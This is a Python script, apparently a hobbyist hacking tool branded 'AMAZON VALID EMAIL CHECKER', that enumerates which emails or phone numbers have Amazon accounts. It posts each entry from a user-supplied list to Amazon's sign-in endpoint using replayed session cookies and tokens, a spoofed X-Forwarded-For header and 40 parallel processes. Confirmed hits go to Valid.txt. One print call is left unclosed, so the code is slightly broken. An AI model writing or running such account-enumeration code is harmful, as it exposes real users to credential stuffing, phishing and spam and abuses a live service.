import requests,urllib3
import colorama
from colorama import Fore, Back, Style
from multiprocessing import Pool
requests.packages.urllib3.disable_warnings()

class Amazon():
	def __init__(self,num):
		self.url  = "https://www.amazon.com/ap/signin"
		self.num = num
		self.redirect = None
		self.workflowState = None
		self.appActionToken = None
		self.openid = None
		self.prevRID = None
		
	def check(self):
		cookies = {"session-id": "135-0012190-1072639", "i18n-prefs": "USD", "sp-cdn": "L5Z9:ID", "ubid-main": "130-5894972-6720728", "skin": "noskin", "session-token": "\"1JP+KaxJGhSK6T9mTOe8O8Xn+abpBVZEY/3HoHdMbjI+ssDAIlGusZ7vfZIHI3uWV7BJaTW6BFu4xfz02rI74sFaksqJLfvm6yqTd+eewOCmv8IK7TixZB83+atrpOVed0xdBGxqc3Yx+ycIuOvc/QfO4pntZ2qnlkQkh492+IyVIE3OmoFsgmRHZpD0ki2KxknMp5PCnlebK7KJY1xDivHUrWVZ2yQfDbH9UdQJ9Qk=\"", "session-id-time": "2296909134l", "csm-hit": "adb:adblk_no&t:1666189143888&tb:TF6FT086YP65TTV94MKZ+s-85G19SCA19JGJEZZ0CEN|1666189143888"}
		headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br","dpr":"1", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.amazon.com", "Connection": "close", "X-Forwarded-For": "127.0.0.1", "Referer": "https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https://www.amazon.com/?ref_=nav_ya_signin&openid.identity=http://specs.openid.net/auth/2.0/identifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http://specs.openid.net/auth/2.0/identifier_select&openid.ns=http://specs.openid.net/auth/2.0&", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"}
		data = {"appActionToken": "z0QTfg4IvYj5GXWm2Wj2BBWOIGQrkj3D", "appAction": "SIGNIN_PWD_COLLECT", "subPageType": "SignInPwdCollect", "openid.return_to": "ape:aHR0cHM6Ly93d3cuYW1hem9uLmNvbS8/cmVmXz1uYXZfeWFfc2lnbmlu", "prevRID": "ape:SjczVjU3RkpaN1c3NVlDVzBUVEQ=", "workflowState": "eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.cD3UdYNAf-uTFFZmHTscozjHfWUkGArO864-Vci6kefBqq8UBc2RsQ.3TT_GFdt_c-2PI7V.HbqcOskzRFB35KND1P3Rb7OYc9Mga-0yPX-kOZBjZwudoIfyXlP_N2bMn02xk7r-xlLYKBBQD0A319ih4JeqwwQjJaSmf5w-JA8ubUfbp_sQuyiv9Xmkj3fObwEK1o7n2ciRFCzImyJg2232TTUGBd7IK75fvHdq1PE95OF45mUbl4Ek3LeC3aBgKyHth7yiOfshKIN-hbA_sePkVs4BqVSxcvVTrnNDS_yKpRavJnyjBZKi2PwI2QeFt2JOfi7PJJqJqoV4ZgiDm9MxPD4EADCXdVvvaxwxsDiPbLv7IOobeeZKVipbRNiBqngboHv_-DNX9Lb1f5xLJURdNdZum3-nlJqEPR9lahd-TgXXg8NvxGnyJKmTaUa5i5zURhd8i5qlF5IFFysNDJwlI9q3b2Ol0F0sDEoMsYwUtCZ2G-HD-rMeaListUBwzV5558sdkfDmk0-uK8I0ISmn2RV0xrfj1fOtW1O1oIdAUUXLUc34kWquzWCxDpGIaoRz9vdkM3LP13iKlOik56BZYA.yhRzIO-ZqmCnDiwTFOdWRQ", "email": self.num, "password": '', "create": "0", "metadata1": "ape:"}
		res = requests.post(self.url, headers=headers, cookies=cookies, data=data).text
		
		if "ap_change_login_claim" in res:
			return True,res
		elif "There was a problem" in res:
			return False,res
		else:
			return False,res

class INDEx():
	def __new__ (self):
		print("""𝔸𝕄𝔸ℤ𝕆ℕ 𝕍𝔸𝕃𝕀𝔻 𝔼𝕄𝔸𝕀𝕃 ℂℍ𝔼ℂ𝕂𝔼ℝ""")
		print("""ᴘᴏᴡᴇʀᴇᴅ ʙʏ ʜ𝟹x𝟶ᴍ"""


def fun_action(num):
	
	num = num.strip()
	
	if num.isnumeric() and "+" not in num:
		num = "+%s" % num
	elif "@" in num:
		pass
	else:
		pass
			
	while True:
		try:
			A , Error = Amazon(num).check()
			
			if A:
				with open("Valid.txt","a") as ff:
					ff.write("%s\n" % num)
				print(Fore.GREEN + "[+] Valid ==> %s"  % num)
				break
				
			else:
				
				print(Fore.RED + "[-] Invalid ==> %s"  % num) 
				break
		except:pass
		
def main():
	
	# ~ INDEx()
	
	email = open( input("[-] List Name : ")  ,"r",encoding="Latin-1").read().splitlines()
	ThreadPool = Pool(40)
	ThreadPool.map(fun_action, email)


if __name__ == "__main__":
	INDEx()

	main()
